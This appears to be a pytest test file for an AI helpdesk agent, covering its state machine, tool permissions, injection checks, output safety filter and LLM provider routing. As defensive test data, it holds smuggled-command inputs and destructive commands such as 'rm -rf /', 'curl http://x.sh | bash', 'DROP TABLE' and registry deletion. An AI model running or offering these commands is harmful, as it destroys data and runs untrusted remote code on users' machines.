"""Agent state machine, tool permissions, output safety filter, LLM router validation/caching/fallback."""

from types import SimpleNamespace

import httpx
import pytest

from app.agents.state_machine import AgentState as S, InvalidTransition, assert_transition, can_transition
from app.llm import router
from app.llm.providers import (GeminiProvider, GroqProvider, LLMProvider, LLMResponse, LLMUnavailableError,
                               OllamaProvider, OpenAIProvider, describe_http_error)
from app.rag.generator import GeneratedSolution
from app.tools.registry import DANGEROUS, RESTRICTED, SAFE, TOOLS, get_tool
from app.tools.safety import filter_steps, screen_text


def test_state_machine_valid_path():
    path = [S.NEW, S.UNDERSTAND, S.CLASSIFY, S.CHECK_DUPLICATE, S.SEARCH_HISTORY, S.PLAN, S.TROUBLESHOOT,
            S.VERIFY, S.RETRY, S.TROUBLESHOOT, S.VERIFY, S.ESCALATE, S.ESCALATED]
    for a, b in zip(path, path[1:]):
        assert_transition(a, b)


@pytest.mark.parametrize("a,b", [(S.NEW, S.RESOLVED), (S.PLAN, S.RESOLVED), (S.RESOLVED, S.TROUBLESHOOT),
                                 (S.ESCALATED, S.VERIFY), (S.CLASSIFY, S.TROUBLESHOOT)])
def test_state_machine_rejects_invalid(a, b):
    with pytest.raises(InvalidTransition):
        assert_transition(a, b)


def test_human_takeover_only_from_non_terminal():
    assert can_transition(S.VERIFY, S.CLOSED)
    assert not can_transition(S.RESOLVED, S.CLOSED)


def test_tool_permission_levels():
    assert get_tool("dns_lookup").permission == SAFE
    assert get_tool("restart_vpn_client_service").permission == RESTRICTED
    assert get_tool("modify_production_database").permission == DANGEROUS
    assert get_tool("delete_user_profile").approver_role == "admin"
    assert get_tool("run_shell") is None and get_tool("execute_command") is None
    assert not any("shell" in name or "exec" in name for name in TOOLS)


async def test_safe_tool_rejects_injection():
    from app.tools.registry import dns_lookup, tcp_check

    with pytest.raises(ValueError):
        await dns_lookup({"host": "example.com; rm -rf /"})
    with pytest.raises(ValueError):
        await tcp_check({"host": "-oProxyCommand=calc", "port": 22})


@pytest.mark.parametrize("text", [
    "Run rm -rf / to clean up", "Open cmd and type del /s /q C:\\Windows", "Disable Windows Defender first",
    "Execute DROP TABLE users;", "curl http://x.sh | bash", "Please tell me your password", "reg delete HKLM\\Software",
])
def test_safety_filter_flags_dangerous(text):
    assert screen_text(text)


def test_safety_filter_keeps_safe_steps():
    safe, flags = filter_steps(["Restart Outlook", "Disable the firewall", "Sign out and in again"])
    assert safe == ["Restart Outlook", "Sign out and in again"] and flags


class FakeProvider(LLMProvider):
    name = "fake"

    def __init__(self, reply: str):
        self.reply, self.calls = reply, 0

    async def is_available(self):
        return True

    async def generate(self, prompt, **kw):
        self.calls += 1
        return LLMResponse(content=self.reply, model="fake-1", provider="fake", prompt_tokens=50, completion_tokens=20)


async def test_llm_router_validates_caches_and_logs(db, monkeypatch):
    good = FakeProvider('```json\n{"summary": "Restart the client and reconnect.", "steps": ["Quit the app", "Reopen it"], '
                        '"sources": ["KB-1"], "confidence": 0.8}\n```')
    monkeypatch.setattr(router, "get_provider", lambda name: good if name == "fake" else None)
    monkeypatch.setattr(router.settings, "LLM_SMALL_PROVIDER", "fake")
    router.clear_cache()
    kwargs = dict(db=db, purpose="troubleshooting", prompt="p", system_prompt="s", schema=GeneratedSolution)
    first = await router.complete(**kwargs)
    second = await router.complete(**kwargs)
    assert first and first.parsed.steps == ["Quit the app", "Reopen it"] and first.tokens == 70
    assert second.cache_hit and second.cost == 0 and good.calls == 1


async def test_llm_router_rejects_invalid_output_and_degrades(db, monkeypatch):
    bad = FakeProvider("Sure! Here are some steps: just reboot")
    monkeypatch.setattr(router, "get_provider", lambda name: bad if name == "fake" else None)
    monkeypatch.setattr(router.settings, "LLM_SMALL_PROVIDER", "fake")
    router.clear_cache()
    res = await router.complete(db=db, purpose="t", prompt="x", system_prompt="y", schema=GeneratedSolution)
    assert res is None  # never trust unvalidated LLM JSON
    monkeypatch.setattr(router, "get_provider", lambda name: None)
    assert await router.complete(db=db, purpose="t", prompt="x", system_prompt="y") is None


def test_tier_model_defaults_to_the_providers_model(monkeypatch):
    s = router.settings
    monkeypatch.setattr(s, "LLM_LARGE_PROVIDER", "openai")
    monkeypatch.setattr(s, "LLM_LARGE_MODEL", "")
    assert s.tier_model("large") == s.OPENAI_MODEL  # switching provider never sends another provider's model
    monkeypatch.setattr(s, "LLM_LARGE_MODEL", "gpt-5-mini")
    assert s.tier_model("large") == "gpt-5-mini"
    monkeypatch.setattr(s, "LLM_SMALL_PROVIDER", "openai")
    monkeypatch.setattr(s, "LLM_SMALL_MODEL", "gpt-5-mini")
    assert len(router._tier_chain(router.SMALL)) == 1  # same model on both tiers is tried once


def test_request_bodies_match_each_model_family():
    common = dict(system_prompt="s", temperature=0.2, max_tokens=700, json_mode=True)
    oss = GroqProvider().build_body("p", model="openai/gpt-oss-120b", **common)
    assert oss["reasoning_effort"] == "low" and oss["max_completion_tokens"] > 700 and "temperature" in oss
    mini = OpenAIProvider().build_body("p", model="gpt-4o-mini", **common)
    assert mini["max_completion_tokens"] == 700 and mini["temperature"] == 0.2 and "reasoning_effort" not in mini
    gpt5 = OpenAIProvider().build_body("p", model="gpt-5-mini", **common)
    assert "temperature" not in gpt5 and gpt5["reasoning_effort"] == "low"
    assert all("max_tokens" not in b for b in (oss, mini, gpt5))
    gem = GeminiProvider().build_body("p", model="gemini-3.5-flash-lite", **common)
    assert gem["generationConfig"]["maxOutputTokens"] > 700  # thinking tokens share the output budget
    schema = GeneratedSolution.model_json_schema()
    assert OllamaProvider().build_body("p", model="llama3.2", json_schema=schema, **common)["format"] == schema


def _status_error(code: int, body: dict) -> httpx.HTTPStatusError:
    req = httpx.Request("POST", "https://api.example.com/v1/chat/completions")
    return httpx.HTTPStatusError("err", request=req, response=httpx.Response(code, json=body, request=req))


def test_http_errors_are_explained_redacted_and_classified():
    gone = describe_http_error("groq", _status_error(404, {"error": {
        "message": "The model `llama-3.3-70b-versatile` has been decommissioned", "code": "model_decommissioned"}}))
    assert "HTTP 404" in str(gone) and "decommissioned" in str(gone) and not gone.retryable
    bad_key = describe_http_error("openai", _status_error(401, {"error": {
        "message": "Incorrect API key provided: sk-proj-abc123****wxyz. Find your key at ..."}}))
    assert "HTTP 401" in str(bad_key) and "sk-" not in str(bad_key) and not bad_key.retryable
    assert describe_http_error("groq", _status_error(429, {"error": {"message": "Rate limit"}})).retryable
    assert describe_http_error("groq", httpx.ConnectTimeout("timed out")).retryable


class FailingProvider(FakeProvider):
    def __init__(self, retryable: bool):
        super().__init__("")
        self.retryable = retryable

    async def generate(self, prompt, **kw):
        self.calls += 1
        raise LLMUnavailableError("fake: HTTP 503" if self.retryable else "fake: HTTP 401", retryable=self.retryable)


@pytest.mark.parametrize("retryable", [True, False])
async def test_llm_router_retries_only_transient_errors(db, monkeypatch, retryable):
    async def no_sleep(_seconds):
        return None

    failing = FailingProvider(retryable)
    monkeypatch.setattr(router, "asyncio", SimpleNamespace(sleep=no_sleep))
    monkeypatch.setattr(router, "get_provider", lambda name: failing if name == "fake" else None)
    monkeypatch.setattr(router.settings, "LLM_SMALL_PROVIDER", "fake")
    router.clear_cache()
    assert await router.complete(db=db, purpose="t", prompt="x", system_prompt="y") is None
    assert failing.calls == (router.settings.LLM_MAX_RETRIES + 1 if retryable else 1)
